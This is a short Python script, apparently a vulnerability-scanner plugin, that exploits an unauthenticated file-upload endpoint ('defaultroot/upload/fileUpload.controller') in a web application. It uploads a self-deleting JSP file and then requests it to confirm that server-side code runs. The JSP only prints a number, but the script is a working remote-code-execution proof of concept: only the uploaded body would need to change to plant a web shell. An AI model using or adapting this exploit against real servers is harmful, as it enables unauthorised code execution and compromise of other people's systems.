import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def randomLowercase(n):
	key=""
	zf="qwertyuiopasdfghjklzxcvbnm"
	import random
	for _ in range(n):
		suiji1=random.randint(0,len(zf)-1)
		key+=zf[suiji1]
	return key
rfilename=randomLowercase(4)
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
r2=randomInt(40000, 44800)
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
r3=randomInt(40000, 44800)
def scan(baseurl):
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"defaultroot/upload/fileUpload.controller"
	body='''--b0d829daa06c13d6b3e16b0ad21d1eed\r
Content-Disposition: form-data; name="file"; filename="'''+rfilename+'''.jsp"\r
Content-Type: application/octet-stream\r
\r
<%out.print('''+str(r2)+''' * '''+str(r3)+''');new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\r
--b0d829daa06c13d6b3e16b0ad21d1eed--'''
	headers={'Content-Type': 'multipart/form-data; boundary=b0d829daa06c13d6b3e16b0ad21d1eed'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and 'success' in response.text:
		r11=True
		try:
			uploadfilename=re.findall('"data":"(\d+).jsp"',response.text)[0]
		except:
			uploadfilename=''
	else:
		uploadfilename=''
		r11=False
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+f"defaultroot/upload/html/{uploadfilename}.jsp"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and str(r2 * r3) in response.text:
		r22=True
	else:
		r22=False
	if r11 and r22:
		return True
	else:
		return False
